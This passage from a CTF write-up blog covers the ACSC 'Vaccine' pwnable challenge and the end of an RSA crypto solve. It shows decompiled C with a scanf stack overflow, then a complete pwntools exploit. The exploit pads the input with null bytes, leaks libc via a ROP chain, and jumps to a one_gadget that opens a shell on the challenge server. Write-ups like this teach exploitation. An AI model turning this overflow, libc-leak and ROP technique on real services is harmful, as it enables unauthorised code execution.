<span class="n">c1</span> <span class="o">=</span> <span class="p">{</span><span class="n">redacted</span><span class="p">}</span>
<span class="n">c2</span> <span class="o">=</span> <span class="p">{</span><span class="n">redacted</span><span class="p">}</span>

<span class="n">y</span> <span class="o">=</span> <span class="n">y</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>

<span class="n">e</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="p">(</span><span class="mi">2</span><span class="o">^</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">c1</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">c2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>

<span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>

<span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)):</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="mi">256</span><span class="o">^</span><span class="n">i</span> <span class="o">*</span> <span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>

<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>

<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
</code></pre></div></div>

<p><br /><br /></p>

<h2 id="pwnable---vaccine-117-solves"><strong>Pwnable - Vaccine (117 solves)</strong></h2>

<p>Oh how I hate pwnable….</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">char</span> <span class="n">v5</span><span class="p">[</span><span class="mi">112</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-170h] BYREF</span>
  <span class="kt">char</span> <span class="n">s2</span><span class="p">[</span><span class="mi">112</span><span class="p">];</span> <span class="c1">// [rsp+80h] [rbp-100h] BYREF</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [rsp+F0h] [rbp-90h] BYREF</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+158h] [rbp-28h]</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+160h] [rbp-20h]</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+16Ch] [rbp-14h]</span>

  <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"RNA.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Give me vaccine: "</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">s2</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">)</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">s2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">65</span> <span class="o">&amp;&amp;</span> <span class="n">s2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">67</span> <span class="o">&amp;&amp;</span> <span class="n">s2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">71</span> <span class="o">&amp;&amp;</span> <span class="n">s2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">84</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Only DNA codes allowed!"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Oops.. Try again later"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Congrats! You give the correct vaccine!"</span><span class="p">);</span>
  <span class="n">v8</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"secret.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">v8</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Here is your reward: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><br /></p>

<p>We can see scanf gives buffer overflow.</p>

<p>And if we fill all allocated stacks with NULL bytes, strlen and strcmp will be passed with no problem.</p>

<p>Finding libc and making ROP chain was so hard…… :(</p>

<p>I failed using system(“/bin/sh”), but luckily, one of the one_gadgets worked.</p>

<p><br /></p>

<h3 id="expy"><strong>ex.py</strong></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./vaccine"</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./vaccine'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">libc</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"vaccine.chal.ctf.acsc.asia"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc6_2.31-0ubuntu9.9_amd64.so'</span><span class="p">)</span>
<span class="c1"># libc = ELF('./libc6_2.31-0ubuntu9.8_amd64.so')
</span>
<span class="n">sym</span> <span class="o">=</span> <span class="s">'fopen'</span>

<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
<span class="n">sym_got</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="n">sym</span><span class="p">]</span>

<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x401443</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sym_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"vaccine: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>


<span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="n">sym</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">one_gadget</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xe3afe</span><span class="p">,</span> <span class="mh">0xe3b01</span><span class="p">,</span> <span class="mh">0xe3b04</span><span class="p">]</span>

<span class="n">og</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">*</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span>
<span class="c1"># payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">og</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"vaccine: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

</article>


      </div>
    </main>
  </body>
</html>